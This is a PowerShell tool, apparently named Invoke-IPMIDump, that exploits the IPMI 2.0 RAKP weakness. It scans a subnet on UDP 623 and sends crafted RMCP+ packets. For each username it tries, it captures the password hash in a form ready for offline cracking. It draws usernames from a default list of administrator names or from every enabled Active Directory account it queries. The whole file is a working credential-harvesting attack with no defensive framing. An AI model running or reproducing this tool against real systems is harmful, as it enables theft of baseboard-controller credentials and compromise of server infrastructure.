
function Get-SubnetAddresses {
    Param (
        [IPAddress]$IP,
        [ValidateRange(0, 32)][int]$MaskBits
    )

    $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
    $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
    $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')

    $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )

    $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
    [IPAddress]$upper = (0..3 | % { $LowerBytes[$_] + ($maskbytes[(3 - $_)] -bxor 255) }) -join '.'

    $ips = @($lower, $upper)
    return $ips
}

function Get-IPRange {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Lower,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Upper
    )

    $IPList = [Collections.ArrayList]::new()
    $null = $IPList.Add($Lower)
    $i = $Lower
    while ( $i -ne $Upper ) { 
        $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
        [Array]::Reverse($iBytes)
        $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes, 0) + 1))
        [Array]::Reverse($nextBytes)
        $i = [IPAddress]$nextBytes
        $null = $IPList.Add($i)
    }
    return $IPList
}


function Send-Receive {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.Sockets.UdpClient]$Sock,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [Byte[]]$Data,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )

    $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
    $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
    $receiveBytes = $Sock.Receive([ref]$remoteEP)
    return $receiveBytes
}


function Test-IP {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [Byte[]]$SessionID,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.Sockets.UdpClient]$Sock,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )

    $attemptLimit = 5
    $attemptCount = 0

    while ($attemptCount -lt $attemptLimit) {

        $data = 0x06, 0x00, 0xff, 0x07
        $data += 0x06, 0x10, 0x00, 0x00
        $data += 0x00, 0x00, 0x00, 0x00
        $data += 0x00, 0x00, 0x20, 0x00
        $data += 0x00, 0x00, 0x00, 0x00
        $data += $SessionID
        $data += 0x00, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00
        $data += 0x01, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00
        $data += 0x02, 0x00, 0x00, 0x08
        $data += 0x01, 0x00, 0x00, 0x00

        try {
            $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
            return $sResponse1
        }

        catch [System.Net.Sockets.SocketException] {
            Write-Verbose "[S] $IP does not have IPMI/RMCP+ running or is not vulnerable (Attempt $attemptCount)(User=$User)"
            $attemptCount++

            if ($attemptCount -eq $attemptLimit) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "IPMI not running or not vulnerable on $IP"
                $Sock.Close()
                return -111
            }
        }
    }
}

function Attempt-Retrieve {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$User,

        [Parameter(Mandatory = $true)]
        [ValidatePattern('^\d{1,3}(\.\d{1,3}){3}$')] 
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 65535)]
        [int]$Port
    )
    
    $attemptLimit = 3
    $attemptCount = 0

    while ($attemptCount -lt $attemptLimit) {

        $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | % { [Byte[]]$_ }
        $sock = New-Object System.Net.Sockets.UdpClient
        $sock.Client.ReceiveTimeout = 250

        $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
        if ($tResponse -eq -111) {
            $sock.Close()
            return -111
        }

        if ($tResponse.Length -gt 0) {

            $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | % { [Byte[]]$_ }
            $sUserLength1 = [Byte]($User.Length + 28), 0x00
            $sUserLength2 = [Byte]$User.Length
            $sHexUser = [System.Text.Encoding]::ASCII.GetBytes($User)
            $rRequestID = $tResponse[24..27]

            $data = 0x06, 0x00, 0xff, 0x07
            $data += 0x06, 0x12
            $data += 0x00, 0x00, 0x00, 0x00
            $data += 0x00, 0x00, 0x00, 0x00
            $data += $sUserLength1
            $data += 0x00, 0x00, 0x00, 0x00
            $data += $rRequestID  
            $data += $rRequestSALT
            $data += 0x14, 0x00, 0x00
            $data += $sUserLength2
            $data += $sHexUser

        
            try {
                $sResponse1 = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
                $iMessageLength = $sResponse1[14]
                if ($sResponse1[17] -eq 18) {
                    Write-Host "[-] Invalid username: $User"
                    return
                }
                if ($iMessageLength -eq 60) {

                    $sResponseData = $sResponse1[24..$sResponse1.Length]

                    if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {
                        $global:IPMI_halt = $true
                        $rSessionIDHex = ($rSessionID | ForEach-Object ToString X2) -join ''
                        $rRequestIDHex = ($rRequestID | ForEach-Object ToString X2) -join ''
                        $rResponseSALTHex = ($sResponseData[0..31] | ForEach-Object ToString X2) -join ''
                        $rResponseHashHex = ($sResponseData[32..$sResponseData.Length] | ForEach-Object ToString X2) -join ''
                        $sUserLength2Hex = ($sUserLength2 | ForEach-Object ToString X2) -join ''
                        $sHexUserHex = ($sHexUser | ForEach-Object ToString X2) -join ''
                        $rRequestSALTHex = ($rRequestSALT | ForEach-Object ToString X2) -join ''
                        $Hash = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex + $rResponseSALTHex + '14' + $sUserLength2Hex + $sHexUserHex + ':' + $rResponseHashHex
                        $Hash = $Hash.ToLower()
                        Write-Host
                        Write-Host "[+] "  -ForegroundColor "Green"  -NoNewline
                        Write-Host "[$IP] "
                        Write-Host
                        $User + ":" + $Hash | Write-Host
                        Write-Host
                        $attemptCount = 3
                    }

                }
                else {
                    $sock.Close()
                    return
                }

            }
            catch {
                # Error AR
            
                $attemptCount ++
                Write-Verbose "[A] Trying user again (Attempt=$AttemptCount)(User=$User)"
                $sock.Close()
            }

            finally {
                $sock.Close()
    
            }
        }
    } 
}

function Invoke-IPMIDump {
    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $false)]
        [string]$Users,

        [Parameter(Mandatory = $true)]
        [string]$IP,

        [Parameter(ParameterSetName = 'IncludeDisabled')]
        [switch]$IncludeDisabled,

        [Parameter()]
        [int]$Port = 623
    )

    if ($IP.Contains("/")) {
        $mb = $IP.Split("/")[1]
        $IP = $IP.Split("/")[0]
        $ips = Get-SubnetAddresses -MaskBits $mb -IP $IP
        $ipAddresses = Get-IPRange -Lower $ips[0] -Upper $ips[1]
    }
    else {
        $ipAddresses = @($IP)
    }
    foreach ($ip in $ipAddresses) {
    
        if ([string]::IsNullOrEmpty($Users)) {
            [String[]]$users = @(
    
                "Admin",
                "admin",
                "administrator",
                "ADMIN",
                "root",
                "USERID",
                "ipmiadmin",
                "superuser",
                "operator",
                "service",
                "support",
                "guest",
                "default",
                "system",
                "remote",
                "supervisor",
                "tech",
                "Administrator",
                "manager",
                "test"
            )
            $global:IPMI_halt = $false
            foreach ($user in $users) {
                if ($global:IPMI_halt) { break }
                $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                if ($res -eq -111) {
                    break
                }
            }
        }
    
    
        elseif ($Users -eq "Domain Users") {
    
            function Get-EnabledDomainUsers {
                $directoryEntry = [ADSI]"LDAP://$env:USERDNSDOMAIN"
                $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
                $searcher.PageSize = 1000
                if ($IncludeDisabled) { $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(SamAccountName=*)(!userAccountControl:1.2.840.113556.1.4.803:=16))" }
                else { $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(SamAccountName=*)(!userAccountControl:1.2.840.113556.1.4.803:=16))" }
                $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
    
                try {
                    $results = $searcher.FindAll()
                    $enabledUsers = $results | ForEach-Object {
                        $samAccountName = $_.Properties["samAccountName"][0]
                        if ($samAccountName -ne $null) {
                            $samAccountName
                        }
                    }
                    return $enabledUsers
                }
                catch {
                    Write-Error "Failed to query Active Directory: $_"
                    return $null
        
                }
            }

            $EnabledDomainUsers = Get-EnabledDomainUsers

            $global:IPMI_halt = $false
            foreach ($user in $EnabledDomainUsers) {
                if ($global:IPMI_halt) { break }

                $res = Attempt-Retrieve -User $user -Port $Port -IP $ip
                if ($res -eq -111) {
                    break
        
                }
            }
        }


        else {
            if ([System.IO.File]::Exists($Users)) {
                foreach ($User in Get-Content $Users) {
                    Start-Sleep -Milliseconds 100
                    $res = Attempt-Retrieve -User $User -Port $Port -IP $ip
                    if ($res -eq -111) {
                        break
                    }
                }
            }
            else {
                Attempt-Retrieve -User $Users -Port $Port -IP $ip
            
            }
        }        
    }
}
